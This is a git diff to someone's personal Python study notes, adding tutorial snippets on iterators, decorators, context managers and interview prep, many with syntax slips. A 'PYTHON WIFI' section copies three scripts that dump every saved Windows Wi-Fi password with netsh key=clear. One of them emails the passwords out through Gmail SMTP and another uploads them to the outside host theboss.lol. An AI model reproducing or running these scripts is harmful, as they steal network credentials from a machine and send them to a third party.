@@ -214,6 +214,9 @@ max()                   # returns the highest element in a list
 
 sorted(L)               # returns a sorted array , from lowest to highest 
 
+eval("3+4")             #evaluates string and returns an object 
+> 7
+
 ---------------------------------------------
 STRING METHODS
 ---------------------------------------------
@@ -2106,4 +2109,617 @@ plt.xlabel('Days since the first suspect')
 plt.ylabel('Number of cases')
 plt.legend()
 plt.show()
+
+
+-----------------------------------------------------------------------------
+PYTHON WIFI
+-----------------------------------------------------------------------------
+# using Windows
+
+# netsh wlan show profiles
+
+# netsh wlan show profile calabash-5G key=clear                 #to get password; key content
+
+# cat get_wifi_passwords.py
+(https://github.com/davidbombal/red-python-scripts/tree/main)
+
+
+import subprocess                        # Import subprocess so we can use system commands
+import re
+
+command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
+profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
+
+wifi_list = list()
+
+if len(profile_names) != 0:
+    for name in profile_names:
+        
+        wifi_profile = dict()        
+        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()        
+        if re.search("Security key           : Absent", profile_info):
+            continue
+        else:
+            
+            wifi_profile["ssid"] = name           
+            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()            
+            password = re.search("Key Content            : (.*)\r", profile_info_pass)            
+            if password == None:
+                wifi_profile["password"] = None
+            else:                
+                wifi_profile["password"] = password[1]
+            
+            wifi_list.append(wifi_profile) 
+
+for x in range(len(wifi_list)):
+    print(wifi_list[x]) 
+    
+    
+# cat get_wifi_emails.py
+import subprocess
+import re
+import smtplib
+from email.message import EmailMessage
+
+# Python allows us to run system commands by using a function provided by the subprocess module (subprocess.run(<list of command line arguments goes here>, <specify the second argument if you want to capture the output>))
+# The script is a parent process and creates a child process which runs the system command, and will only continue once the child process has completed.
+# To save the contents that gets sent to the standard output stream (the terminal) we have to specify that we want to capture the output, so we specify the second argument as capture_output = True. This information gets stored in the stdout attribute. The information is stored in bytes and we need to decode it to Unicode before we use it as a String in Python.
+command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
+
+# We imported the re module so that we can make use of regular expressions. We want to find all the Wifi names which is always listed after "ALL User Profile     :". In the regular expression we create a group of all characters until the return escape sequence (\r) appears.
+profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
+
+# We create an empty list outside of the loop where dictionaries with all the wifi username and passwords will be saved.
+wifi_list = list()
+
+
+# If we didn't find profile names we didn't have any wifi connections, so we only run the part to check for the details of the wifi and whether we can get their passwords in this part.
+if len(profile_names) != 0:
+    for name in profile_names:
+        # Every wifi connection will need its own dictionary which will be appended to the wifi_list
+        wifi_profile = dict()
+        # We now run a more specific command to see the information about the specific wifi connection and if the Security key is not absent we can possibly get the password.
+        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
+        # We use a regular expression to only look for the absent cases so we can ignore them.
+        if re.search("Security key           : Absent", profile_info):
+            continue
+        else:
+            # Assign the ssid of the wifi profile to the dictionary
+            wifi_profile["ssid"] = name
+            # These cases aren't absent and we should run them "key=clear" command part to get the password
+            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
+            # Again run the regular expressions to capture the group after the : which is the password
+            password = re.search("Key Content            : (.*)\r", profile_info_pass)
+            # Check if we found a password in the regular expression. All wifi connections will not have passwords.
+            if password == None:
+                wifi_profile["password"] = None
+            else:
+                # We assign the grouping (Where the password is contained) we are interested to the password key in the dictionary.
+                wifi_profile["password"] = password[1]
+            # We append the wifi information to the wifi_list
+            wifi_list.append(wifi_profile)
+
+# Create the message for the email
+email_message = ""
+for item in wifi_list:
+    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"
+
+# Create EmailMessage Object
+email = EmailMessagessid
+# Who is the email from
+email["from"] = "name_of_sender"
+# To which email you want to send the email
+email["to"] = "email_address"
+# Subject of the email
+email["subject"] = "WiFi SSIDs and Passwords"
+email.set_content(email_message)
+
+# Create smtp server
+with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
+    smtp.ehlo()
+    # Connect securely to server
+    smtp.starttls()
+    # Login using username and password to dummy email. Remember to set email to allow less secure apps if using Gmail
+    smtp.login("login_name", "password")
+    # Send email.
+    smtp.send_message(email)
+    
+    
+ # cat get_wifi_rest.py
+ 
+ import subprocess
+import re
+import requests
+
+# Python allows us to run system commands by using a function provided by the subprocess module (subprocess.run(<list of command line arguments goes here>, <specify the second argument if you want to capture the output>))
+# The script is a parent process and creates a child process which runs the system command, and will only continue once the child process has completed.
+# To save the contents that gets sent to the standard output stream (the terminal) we have to specify that we want to capture the output, so we specify the second argument as capture_output = True. This information gets stored in the stdout attribute. The information is stored in bytes and we need to decode it to Unicode before we use it as a String in Python.
+command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
+
+# We imported the re module so that we can make use of regular expressions. We want to find all the Wifi names which is always listed after "ALL User Profile     :". In the regular expression we create a group of all characters until the return escape sequence (\r) appears.
+profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
+
+# We create an empty list outside of the loop where dictionaries with all the wifi ssid and passwords will be saved.
+wifi_list = list()
+
+
+# If we didn't find profile names we didn't have any wifi connections, so we only run the part to check for the details of the wifi and whether we can get their passwords in this part.
+if len(profile_names) != 0:
+    for name in profile_names:
+        # Every wifi connection will need its own dictionary which will be appended to the wifi_list
+        wifi_profile = dict()
+        # We now run a more specific command to see the information about the specific wifi connection and if the Security key is not absent we can possibly get the password.
+        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
+        # We use a regular expression to only look for the absent cases so we can ignore them.
+        if re.search("Security key           : Absent", profile_info):
+            continue
+        else:
+            # Assign the SSID of the wifi profile to the dictionary
+            wifi_profile["ssid"] = name
+            # These cases aren't absent and we should run them "key=clear" command part to get the password
+            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
+            # Again run the regular expressions to capture the group after the : which is the password
+            password = re.search("Key Content            : (.*)\r", profile_info_pass)
+            # Check if we found a password in the regular expression. All wifi connections will not have passwords.
+            if password == None:
+                wifi_profile["password"] = None
+            else:
+                # We assign the grouping (Where the password is contained) we are interested to the password key in the dictionary.
+                wifi_profile["password"] = password[1]
+            # We append the wifi information to the wifi_list
+            wifi_list.append(wifi_profile)
+
+
+# Write the contents of the wifi ssids and passwords to file
+with open('wifi.txt', 'w+') as fh:
+    for x in wifi_list:
+        fh.write(f"SSID: {x['ssid']}\nPassword: {x['password']}\n")
+
+# Open file with read-only in binary so you can send via API
+with open('wifi.txt', 'rb') as fh:
+    # Do put request with the data as the file
+    r = requests.put("http://theboss.lol/", data=fh)
+    # status code should be 200 if successful
+    if r.status_code == 200:
+        print('Success')
+
+#Better Coding Ways
+#1
+num1 = 10_000_000_000
+num2 = 10_000_000
+
+total = num1+num2
+print(f"{total :,}")
+
+#2
+#instead of manually closing the file, can use a CONTEXT MANAGERS
+
+with open("test.txt", "r") as f:
+	file_contents = f.read()
+	
+words = file_contents.split(" ")
+word_count = len(words)
+	
+#3 iterating over a list
+names = ["Yaw", "Kwame","Ama","Adwoa"]
+
+for index, name in enumerate(names):
+	print(index, name)
+	
+for index, name in enumerate(names, start=1):      #if you want index to start at 1
+	print(index, name)
+	
+#4 working with multiple lists
+names = ["Yaw", "Kwame","Ama","Adwoa","F"]
+heroes = ["A","B","C","D", "E"]
+universe = ["Marvel","DC","Marvel","DC"]
+
+for index, name in enumerate(names):
+    hero = heroes[index]
+    print(f"{name} is actually {hero}")
+print()
+
+for name, hero in zip(names,heroes):
+    print(f"{name} is actually {hero}")
+    
+#5 Unpacking values
+#Normal
+value = (1,2)
+print(value)
+
+#Unpacking
+a, b = (1,2)
+print(a)
+>1
+
+a, _ = (1,2)     #if you wont use the other value only , you can hide the other object with underscore
+print(a)
+> 1
+
+
+a, b, *c = (1,2,3,4,5)     #* unpacks the remaining elements
+print(c)
+> [3,4,5]
+
+
+#6 Class
+class Person():
+	pass
+	
+person = Person()
+
+# person.first = "Corey"
+# person.last = "Schafer"
+
+#print(person.first)
+#print(person.last)
+
+person_info = {"first":"Corey","last":"Schafer"}
+
+for key, value in person_info.items():
+	setattr(person, key, value)
+
+for key, _ in person_info.items():
+	print(getattr(person, key))
+	
+#print(person.first)
+#print(person.last)
+
+# 7 Taking Password input
+# normal
+username = input("Username: ")
+password = input("Password: ")
+
+print("logging in...")
+
+# secure way
+from getpass import getpass
+
+username = input("Username: ")
+password = getpass("Password: ")
+
+print("logging in...")
+
+
+#8 Using modules
+python -m json.tool                     # python -m instead of python bookstore.py because we do not have the script(running a module), will check the sys path and run it
+
+python -m password similar to python password.py
+
+import smtpd 
+
+help(smtpd)                        #used to display the documentation of modules, functions, classes, keywords etc.
+
+dir(smtpd)                         #returns list of the attributes and methods of any object (say functions , modules, strings, lists, dictionaries etc.)
+
+# Top Mistakes
+1.Spaces and tabs. Need to Upgrade IDE and set tabs as spaces
+
+2. Saving python file as main.py and importing math module raises an error when script is run
+> Name of file should be changed
+
+3. Import errors (definitely issue with path or file having same name as module we trying to call in file)
+
+4. How to do mutable default arguments
+#Wrong way
+def add_employee(emp, emp_list=[]):
+	emp_list.append(emp)
+	print(emp_list)
+
+emps = ["John","Jane"]
+
+add_employee("Corey")
+add_employee("John")
+> ["Corey","John"]                       #returns both COrey and John instead of just John
+
+#Right way
+def add_employee(emp, emp_list=None):
+	if emp_list is None:
+		emp_list = []
+	emp_list.append(emp)
+	print(emp_list)
+
+emps = ["John","Jane"]
+
+add_employee("Corey")
+add_employee("John")                    #returns only John
+
+#
+import time
+from datetime import datetime
+
+def display_time(time=datetime.now()):
+	print(time.strftime("%B %d, %Y %H:%M:%S"))
+	
+display_time()
+time.sleep(1)
+display_time()
+
+def display_time(time=None):
+	time= datetime.now()
+	print(time.strftime("%B %d, %Y %H:%M:%S"))
+	
+display_time()
+time.sleep(1)
+display_time()                # returns the correct output becuase of the way functions work
+
+#6. Issues with Iterators like zip
+names = ["Yaw", "Kwame","Ama","Adwoa","F"]
+heroes = ["A","B","C","D", "E"]
+
+identities = list(zip(names,heroes))           #list are not exhausted like other interables
+
+print(identities)        # with Python 3, you would need function list
+
+for identity in identities:
+    print("{} is actually {}".format(identity[0], identity[1]))
+    
+#7. os module issues
+import os
+os.rename(filename)
+
+from os import rename, remove                  #allow us to use multiple methods of the module
+remove(filename)
+remove()
+
+from html import escape as h_escape
+from glob import escape as g_escape
+
+print(help(h_escape)
+
+
+####ITERATORS AND ITERABLES
+#A List is a iterable, but not an iterator. It doesnt have a state and a __next__() method
+#Iterable is an object, which one can iterate over.
+#Iterator is an object, which is used to iterate over an iterable object using __next__() method. Iterators have __next__() method, which returns the next item of the object. 
+#Note that every iterator is also an iterable, but not every iterable is an iterator.
+
+nums = [1,2,3]
+
+for num in nums:
+	print(num)
+
+print(dir(nums))
+> __iter__
+
+i_nums = iter(nums)     #nums.__iter__().. calls the dunder function in the background
+
+print(i_nums)
+print(dir(i_nums))
+>__next__
+
+print(next(i_nums))
+print(next(i_nums))
+print(next(i_nums))
+
+> 1
+  2
+  3
+  
+ class MyRange:
+ 	def __init__(self, start, end):
+		self.value = start
+		self.end = end
+	
+	def __iter__(self):
+		return self
+	
+	def __next__(self):
+		if self.value >= self.end:
+			raise StopIteration
+		current = self.value
+		self.value += 1
+		return current
+		
+#creating a generator function
+def my_range(start,end):
+	current = start
+	while current < end:
+		yield current
+		current += 1
+	
+nums = MyRange(1,10)
+
+print(next(nums))
+print(next(nums))
+
+###MODULES ITERTOOLS
+import itertools
+
+counter = itertools.count()
+
+data = [100,200,300,400]
+
+print(next(counter))
+print(next(counter))
+
+daily_data = list(zip(itertools.count(), data))
+
+print(daily_data)
+> [(0,100),(1,200),(2,300),(3,400)
+
+counter = itertools.cycle(("On","Off"))
+print(next(counter))
+print(next(counter))
+print(next(counter))
+print(next(counter))
+
+squares = map(pow, range(10), itertools.repeat(2))
+
+print(list(squares))     #cast it to a list
+
+#Context Manager
+from contextlib import contextmanager
+
+@contextmanager
+def open_file(file, mode):
+	f = open(file, mode)
+	yield f
+	f.close()
+	
+with open_file("sample.txt","w") as f:
+	f.write("I tried, but i lost")
+	
+print(f.closed)
+
+import os
+from contextlib import contextmanager
+
+cwd = os.getcwd()
+os.chdir('Sample-Dir-One')
+print(os.listdir())
+os.chdir(cwd)
+
+cwd = os.getcwd()
+os.chdir('Sample-Dir-Two')
+print(os.listdir())
+os.chdir(cwd)
+
+@contextmanager
+def change-dir(destination):
+	try:
+		cwd = os.getcwd()
+		os.chdir(destination)
+		yield
+	finally:
+		os.chdir(cwd)
+
+with change_dir('Sample-Dir-One'):
+	print(os.listdir())
+
+with change_dir('Sample-Dir-Two'):
+	print(os.listdir())
+
+###DECORATORS
+# A decorator is a design pattern in Python that allows a user to add new functionality to an existing object without modifying its structure.
+# Decorators are usually called before the definition of a function you want to decorate.
+
+def outer_functions():
+	message = "Hi"
+	
+	def inner_function():
+		print(message)
+	return inner_function()
+
+outer_function()
+
+def decorator_function(original_function):
+	def wrapper_function():
+		print("wrapper executed this before {}".format(original_function.__name__))
+		return original_function()
+	return wrapper_function
+
+@decorator function
+	def display():
+		print("display function ran")
+
+#display = decorator_function(display)
+
+display()
+
+
+##FIRST CLASS FUNCTIONS
+#First-class functions means that the language treats functions as values – that you can assign a function into a variable, pass it around
+
+def square(x):
+	return x*x
+	
+def my_map(func, arg_list):
+	result = []
+	for i in arg_list:
+		result.append(func(i))
+	return result
+
+squares = my_map(square, [1,2,3,4,5])
+
+print(squares)
+
+def cube(x)
+	return x * x * x
+f = square(5)
+
+print(square)
+print(f)
+
+f = sqaure      #assign function as variable
+print(f(5))
+
+#####Preparing for Python Interview
+#1. HOW TO WRITE CODE ON WHITEBOARD OR PAPER 
+#how to use for loop to loop through range of numbers
+for i in range(1,11):
+	print(i)
+	
+#using while loop
+i=1
+while i <= 10:
+	print(i)
+	i += 1
+#2.KNOW BASIC PYTHON CONTROL FLOW
+a =10
+b = 20
+if a<b:
+	print( "{} is less than {}".format(a,b))
+elif a == 20 :
+	print( "{} is equal to {}".format(a,b))
+else:
+	print( "{} is greater than {}".format(a,b))
+
+#3. ABLE TO DISCUSS HOW YOU'VE USED PYTHON
+- a web scraping project
+- a program for system task, display system usage
+
+import os, glob
+
+os.chdir("/Users/HP.DESKTOP-MVC2C5I/Pictures")      #changing directory
+for file in glob.glob("*.jpg"):                     #look through file system
+	print(file)                                 #return file
+	
+#4. KNOW HOW TO SOLVE COMMON INTERIEW PROBLEMS
+# fIZZ bUzz
+for num in range(1,101):
+	if num % 5 == 0 and num % 3 ==0:
+		print("FizzBuzz")
+	elif num % 3 == 0:
+		print("Fizz")
+	elif num % 5 == 0:
+		print("Buzz")
+	else:
+		print(num)
+		
+#fibonacci Sequence
+a, b = 0, 1
+
+for i in range(0,10):
+	print(a)
+	a, b =b, a+b
+
+
+[Pyhton Questions](https://bidsarmanish.blogspot.com/2017/10/python-interview-questions-2.html)
+
+#10. KNOW THE BASICS OF OTHER TECHNOLOGIES 
+#T-shaped profesional model is a metaphor used in job recruitment to describe the abilities of persons in the workforce. 
+#The vertical bar on the letter T represents the DEPTH of related skills and expertise in a single field, 
+#whereas the horizontal bar(BREADTH) is the ability to collaborate across disciplines with experts in other areas and to apply knowledge in areas of expertise other than one's own.
+
+#
+
+
+
+	
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
